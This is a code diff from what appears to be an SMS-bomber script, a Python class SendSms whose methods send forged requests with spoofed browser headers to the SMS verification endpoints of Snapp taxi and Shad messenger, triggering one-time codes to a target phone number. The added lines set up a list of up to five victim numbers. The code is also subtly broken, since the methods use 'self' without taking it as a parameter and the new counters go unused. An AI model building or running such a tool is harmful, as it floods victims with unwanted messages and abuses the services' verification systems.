@@ -1451,7 +1451,11 @@ class SendSms():
                     break
             else:
                 continue
+    
     def snap(phone):
+        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
+        bos_olmayan = len([x for x in liste if x != "bos"])
+        uygulanan_nolar = 0
         snapH = {"Host": "app.snapp.taxi", "content-length": "29", "x-app-name": "passenger-pwa", "x-app-version": "5.0.0", "app-version": "pwa", "user-agent": generate_user_agent(os="android"), "content-type": "application/json", "accept": "*/*","origin": "https://app.snapp.taxi", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://app.snapp.taxi/login/?redirect_to\u003d%2F", "accept-encoding": "gzip, deflate, br", "accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6", "cookie": "_gat\u003d1"}
         snapD = {"cellphone": phone}
         try:
@@ -1461,6 +1465,9 @@ class SendSms():
             pass
 
     def shad(phone):
+        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
+        bos_olmayan = len([x for x in liste if x != "bos"])
+        uygulanan_nolar = 0
         shadH = {"Host": "shadmessenger12.iranlms.ir", "content-length": "96", "accept": "application/json, text/plain, */*", "user-agent": generate_user_agent(os="android"), "content-type": "text/plain","origin": "https://shadweb.iranlms.ir", "sec-fetch-site": "same-site", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://shadweb.iranlms.ir/", "accept-encoding": "gzip, deflate, br", "accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"}
         shadD = {"api_version": "3", "method": "sendCode", "data": {"phone_number": phone.split("+")[1], "send_type": "SMS"}}
         try:
